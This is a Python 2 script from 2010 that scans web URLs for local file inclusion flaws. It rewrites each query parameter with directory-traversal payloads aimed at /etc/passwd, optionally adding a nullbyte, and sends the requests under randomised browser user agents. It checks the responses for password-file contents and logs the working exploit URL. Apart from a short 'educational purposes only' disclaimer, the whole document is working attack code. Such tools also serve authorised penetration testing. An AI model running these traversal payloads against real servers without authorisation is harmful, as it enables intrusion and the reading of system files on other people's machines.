#!/usr/bin/python

# Simple Local File Inclusion Vulnerability Scanner
# by Valentin Hoebel (valentin@xenuser.org)
# Version 1.0 (29th December 2010)

# ASCII FOR BREAKFAST

# ---------- [Description]
# This tool helps you to find LFI (Local File Inclusion) vulnerabilities.

# ---------- [Features]
# - This time with working random user agents ^_^
# - Checks if a connection to the target can be established
# - Some error handling
# - Scans an URL for LFI vulnerabilities
# - Finds out how a possible LFI vulnerability can be exploited (e.g. directory depth)
# - Supports nullbytes
# - Supports common *nix targets, but no Windows systems.
# - Creates a small log file.
# Supports no SEO URLs, such as www.example.com/local-news/
# But in most cases it is possible to find out the real URL and pass it to this script.

# ---------- [Usage example]
# ./lfi_scanner.py --url="http://www.example.com/page.php?url=main"

# ---------- [Known issues]
# - This tool is only able to find "simple" LFI vulnerabilities, but not complex ones.
# - Like most other LFI scanners, this tool here also has trouble with
#   handling certain server responses. So this tool does not work with every website.

# ---------- [Tested with]
# Targets: Apache2 servers and PHP websites, various Linux systems
# Script platform: Ubuntu Lucid Lynx and Python 2.6.5

# ---------- [Notes]
# - This tool was developed using a Python 2.6.5 interpreter.
# - I admit: This tool is a little bit slow and not very efficient (too many variables etc.). Sorry about that :P
# - Modify, distribute, share and copy this code in any way you like!
# - Please note that this tool was created and published for educational purposes only, e.g. for pentesting
#   your own website. Do not use it in an illegal way and always know + respect your local laws.
#   I am not responsible if you cause any damage with it.

# ---------- [Changelog]
# - Version 1.0 (29th December 2010):
#    - Initial release

# Power to the cows!

import getopt,  sys,  random,  urllib,  urllib2,  httplib,  re,  string,  os
from urllib2 import Request,  urlopen,  URLError,  HTTPError
from urlparse import urlparse
from time import gmtime, strftime
 
def print_usage(): 
    print_banner()
    print "[!] Wrong argument and parameter passed. Use --help and learn how to use this tool :)"
    print "[i] Hint: You need to pass a value for --url=\"<value>\" ."
    print "[i] Example: ./lfi_scanner.py --url=\"http://www.example.com/page.php?file=main\" "
    print ""
    print ""
    sys.exit()
    return
    
def print_help():
    print_banner()
    print "((Displaying the content for --help.))"
    print ""
    print "[Description]"
    print "The Simple Local File Inclusion Vulnerability Scanner"
    print "helps you to find LFI vulnerabilities."
    print ""
    print "[Usage]"
    print "./lfi_scanner.py --url=\"<URL with http://>\" "
    print ""
    print "[Usage example]"
    print "./lfi_scanner.py --url=\"http://www.example.com/page.php?file=main\" "
    print ""
    print "[Usage notes]"
    print "- Always use http://...."
    print "- This tool does not work with SEO URLs, such as http://www.example.com/news-about-the-internet/."
    print "  If you only have a SEO URL, try to find out the real URL which contents parameters."
    print ""
    print "[Feature list]"
    print "- Provides a random user agent for the connection."
    print "- Checks if a connection to the target can be established."
    print "- Tries to catch most errors with error handling. "
    print "- Scans for LFI vulnerabilities. "
    print "- Finds out how a possible LFI vulnerability can be exploited (e.g. directory depth)."
    print "- Supports nullbytes!"
    print "- Supports common *nix targets, but no Windows systems."
    print "- Creates a small log file."
    print ""
    print "[Some notes]"
    print "- Tested with Python 2.6.5."
    print "- Modify, distribute, share and copy the code in any way you like!"
    print "- Please note that this tool was created for educational purposes only."
    print "- Do not use this tool in an illegal way. Know and respect your local laws."
    print "- Only use this tool for legal purposes, such as pentesting your own website :)"
    print "- I am not responsible if you cause any damage or break the law."
    print "- Power to teh c0ws!"
    print ""
    print ""
    sys.exit()
    return
    
def print_banner():
    print ""
    print ""
    print ""
    print "Simple Local File Inclusion Vulnerability Scanner"
    print "by Valentin Hoebel (valentin@xenuser.org)"
    print ""
    print "Version 1.0 (29th December 2010)  ^__^"
    print "                                  (oo)\________"
    print "                                  (__)\        )\/\ "
    print "                                      ||----w |"
    print "Power to teh cows!                    ||     ||"
    print "____________________________________________________"
    print ""
    return

def test_url(scan_url):
    print ""
    print "[i] Assuming the provided data was correct."
    print "[i] Trying to establish a connection with a random user agent..."
    
    user_agents = [
                            "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8", 
                            "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre", 
                            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)", 
                            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)", 
                            "Mozilla/3.01 (Macintosh; PPC)", 
                            "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",   
                            "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",  
                            "Opera/8.00 (Windows NT 5.1; U; en)",  
                            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
                          ]
    user_agent = random.choice (user_agents)
    check=""
    
    request_website = urllib2.Request(scan_url)
    request_website.add_header('User-Agent', user_agent)
    
    try:
        check = urllib2.urlopen(request_website)
    except HTTPError,  e:
        print "[!] The connection could not be established."
        print "[!] Error code: ",  e
        print "[!] Exiting now!"
        print ""
        print ""
        sys.exit(1)
    except URLError, e:
        print "[!] The connection could not be established."
        print "[!] Reason: ",  e
        print "[!] Exiting now!"
        print ""
        print ""
        sys.exit(1)
    else:
        print "[i] Connected to target! URL seems to be valid."
        print "[i] Jumping to the scan feature."
    return 
    
    
def scan_lfi(scan_url):    
    # Define all variables of this function
    parameters = {}
    original_value_of_tested_parameter = ""
    check_value_of_tested_parameter = ""
    check_value_of_tested_parameter_with_nullbyte = ""
    lfi_found = 0
    param_equals = "="
    param_sign_1 = "?"
    param_sign_2 = "&"
    nullbyte = "%00"
    one_step_deeper = "../"
    for_changing_the_dump_file_name = "_"
    max_depth = 20
    i = 0
    nullbyte_required = 1
    depth = 0
    query_string = ""
    modified_query_string = ""
    lfi_url_part_one = ""
    lfi_url_part_two = ""
    lfi_url_part_three = ""
    lfi_url_part_four = ""
    lfi_url = ""
    find_nasty_string = "root:x:0:0:"
    find_nasty_string_2 = "mail:x:8:"
    user_agents = [
                            "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8", 
                            "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre", 
                            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)", 
                            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)", 
                            "Mozilla/3.01 (Macintosh; PPC)", 
                            "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",   
                            "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",  
                            "Opera/8.00 (Windows NT 5.1; U; en)",  
                            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
                          ]
    user_agent = random.choice (user_agents)
    lfi_response=""
    lfi_response_source_code = ""
    replace_string = ""
    replace_string_2 = ""
    replace_me = ""
    exploit_depth= 0
    folder_name = ""
    cd_into = ""
    log_file_name = ""
    local_file = "etc/passwd"
    local_file_for_first_test = "/etc/passwd"
    lfi_exploit_url = ""
    
     # We have to split up the URL in order to replace the value of the vulnerable parameter
    get_parsed_url = urlparse(scan_url)
    print "[i] IP address / domain: " + get_parsed_url.netloc

    if len(get_parsed_url.path) == 0:
        print "[!] The URL doesn't contain a script (e.g. target/index.php)."
    else:
        print "[i] Script:",  get_parsed_url.path
    if len(get_parsed_url.query) == 0:
        print "[!] The URL doesn't contain a query string (e.g. index.php?var1=x&controller=main)."
    else:
        print "[i] URL query string:",  get_parsed_url.query
        print ""

    # Finding all URL parameters
    if param_sign_1 in scan_url and param_equals in scan_url:
        print "[i] It seems that the URL contains at least one parameter."
        print "[i] Trying to find also other parameters..."
        
        # It seems that there is at least one parameter in the URL. Trying to find out if there are also others...
        if param_sign_2 in get_parsed_url.query and param_equals in get_parsed_url.query:
            print "[i] Also found at least one other parameter in the URL."
        else:
            print "[i] No other parameters were found."
            
    else:
        print ""
        print "[!] It seems that there is no parameter in the URL."
        print "[!] How am I supposed to find a vulnerability then?"
        print "[!] Please provide an URL with a script and query string."
        print "[!] Example: target/index.php?cat=1&article_id=2&controller=main"
        print "[!] Hint: I can't handle SEO links, so try to find an URL with a query string."
        print "[!] This can most likely be done by having a look at the source code (rightclick -> show source code in your browser)."
        print "[!] Exiting now!"
        print ""
        print ""
        sys.exit(1)
    
    # Detect the parameters
    # Thanks to atomized.org for the URL splitting and parameters parsing part!
    parameters = dict([part.split('=') for part in get_parsed_url[4].split('&')])

    # Count the parameters
    parameters_count = len(parameters)
    
    # Print the parameters and store them in single variables
    print "[i] The following", parameters_count, "parameter(s) was/were found:"
    print "[i]",  parameters
    
    # Have a look at each parameter and do some nasty stuff 
    for index, item in enumerate(parameters):
        print "[i] Probing parameter \"",  item, "\"..."
        
        check_value_of_tested_parameter = local_file_for_first_test 
        check_value_of_tested_parameter_with_nullbyte = local_file_for_first_test + nullbyte
        query_string = get_parsed_url.query
    
        # Find out what value the checked parameter currently has
        for key, value in parameters.items():
            if key == item:
                # Save the value of the vulnerable parameter, so we later can search in in the URL
                original_value_of_tested_parameter = value
    
        # Our main routine, maybe the most important part of this script
        # At first without the nullbyte
        for depth in range(i, max_depth):
            # Replace the default value of the vulnerable parameter with our LFI string
            replace_string = (depth * one_step_deeper) + local_file
            replace_string_2 = item + param_equals + (depth * one_step_deeper) + local_file
            
            # The first test is a special case. With the code above, we would check for the file "etc/passwd" which does not
            # work. Therefore we replace "etc/passwd" with "/etc/passwd" for our first vulnerability check.
            if depth== 0:
                replace_string = local_file_for_first_test 
                replace_string_2 = item + param_equals  + local_file_for_first_test
                
            replace_me = item + param_equals + original_value_of_tested_parameter
            modified_query_string = query_string.replace(replace_me,  replace_string_2)
            
            # Now craft the URL
            lfi_url_part_one = "".join(get_parsed_url[0:1]) + "://"
            lfi_url_part_two = "".join(get_parsed_url[1:2]) 
            lfi_url_part_three = "".join(get_parsed_url[2:3])  + "?"
            lfi_url_part_four = "".join(modified_query_string)  
            lfi_url = lfi_url_part_one + lfi_url_part_two + lfi_url_part_three + lfi_url_part_four
            
            # Ok, everything is prepared to enter subspace.. eeh, to call the URL (Stargate fans get this joke!)
            request_website = urllib2.Request(lfi_url)
            request_website.add_header('User-Agent', user_agent)
    
            try:
                lfi_response = urllib2.urlopen(request_website)
            except URLError,  e:
                print "[!] The connection could not be established."
                print "[!] Reason: ",  e
            else:
                lfi_response_source_code = lfi_response.read()
                if find_nasty_string in lfi_response_source_code:
                    print "[+] Found signs of a LFI vulnerability! No nullbyte was required."
                    print "[+] URL: " + lfi_url
                    lfi_exploit_url  = lfi_url
                    nullbyte_required = 0
                    lfi_found  = 1
                    exploit_depth = depth
                    break
                else:
                    if find_nasty_string_2 in lfi_response_source_code:
                        print "[+] Found signs of a LFI vulnerability! No nullbyte was required." 
                        print "[+] URL: " + lfi_url
                        lfi_exploit_url  = lfi_url
                        nullbyte_required = 0
                        lfi_found  = 1
                        exploit_depth = depth
                        break
        
        if nullbyte_required == 1:
            # Now with the nullbyte
            for depth in range(i, max_depth):
                # Replace the default value of the vulnerable parameter with our LFI string
                replace_string = (depth * one_step_deeper) + local_file + nullbyte
                replace_string_2 = item + param_equals + (depth * one_step_deeper) + local_file + nullbyte
            
                # The first test is a special case. With the code above, we would check for the file "etc/passwd" which does not
                # work. Therefore we replace "etc/passwd" with "/etc/passwd" for our first vulnerability check.
                if depth== 0:
                    replace_string = check_value_of_tested_parameter_with_nullbyte
                    replace_string_2 = item + param_equals  + check_value_of_tested_parameter_with_nullbyte
                
                replace_me = item + param_equals + original_value_of_tested_parameter
                modified_query_string = query_string.replace(replace_me,  replace_string_2)
            
                # Now craft the URL
                lfi_url_part_one = "".join(get_parsed_url[0:1]) + "://"
                lfi_url_part_two = "".join(get_parsed_url[1:2]) 
                lfi_url_part_three = "".join(get_parsed_url[2:3])  + "?"
                lfi_url_part_four = "".join(modified_query_string)  
                lfi_url = lfi_url_part_one + lfi_url_part_two + lfi_url_part_three + lfi_url_part_four
            
                # Ok, everything is prepared to enter subspace.. eeh, to call the URL (Stargate fans get this joke!)
                request_website = urllib2.Request(lfi_url)
                request_website.add_header('User-Agent', user_agent)
                
                try:
                    lfi_response = urllib2.urlopen(request_website)
                except URLError,  e:
                    print "[!] The connection could not be established."
                    print "[!] Reason: ",  e
                else:
                    lfi_response_source_code = lfi_response.read()
                    if find_nasty_string in lfi_response_source_code:
                        print "[+] Found signs of a LFI vulnerability! Using the nullbyte was necessary."
                        print "[+] URL: " + lfi_url
                        lfi_exploit_url  = lfi_url
                        lfi_found  = 1
                        exploit_depth = depth
                        break
                    else:
                        if find_nasty_string_2 in lfi_response_source_code:
                            print "[+] Found signs of a LFI vulnerability! Using the nullbyte was necessary."
                            print "[+] URL: " + lfi_url
                            lfi_exploit_url  = lfi_url
                            lfi_found  = 1
                            exploit_depth = depth
                            break
        
    if lfi_found == 0:
        print "[!] Sorry, I was not able to detect a LFI vulnerability here."
        print "[!] Exiting now!"
        print ""
        print ""
        sys.exit()

    # Create a simple log file
    log_file_name = get_parsed_url.netloc + "_-_" + strftime("%d_%b_%Y_%H:%M:%S_+0000", gmtime()) + "_-_scan.log"
    FILE = open(log_file_name,  "w")
    FILE.write("Simple Local File Inclusion Vulnerability Scanner - Log File\n")
    FILE.write("----------------------------------------------------------------------\n\n")
    FILE.write("Scanned URL:\n")
    FILE.write(scan_url + "\n\n")
    FILE.write("LFI URL:\n")
    FILE.write(lfi_exploit_url)
    FILE.close

    print ""
    print "[i] A small log file was created."
    print "[i] Completed the scan. Will now exit!"
    print ""
    print""
    sys.exit(1)

    return
    
    
def main(argv):
    scan_url=""
    
    try:
        opts,  args = getopt.getopt(sys.argv[1:],  "",  ["help",  "url="])
    except getopt.GetoptError   :
        print_usage()
        sys.exit(2)
    
    for opt,  arg in opts:
        if opt in ("--help"):
            print_help()
            break
            sys.exit(1)
        elif opt in ("--url") :
            scan_url=arg
            
    if len(scan_url) < 1:
        print_usage()
        sys.exit()
        
    # Continue if all required arguments were passed to the script.
    print_banner()
    print "[i] Provided URL to scan: " + scan_url
    
    # Check if URL is reachable
    test_url(scan_url)

    # Calling the LFI scanner function
    scan_lfi(scan_url)

if __name__ == "__main__":
    main(sys.argv[1:])
    
### EOF ###
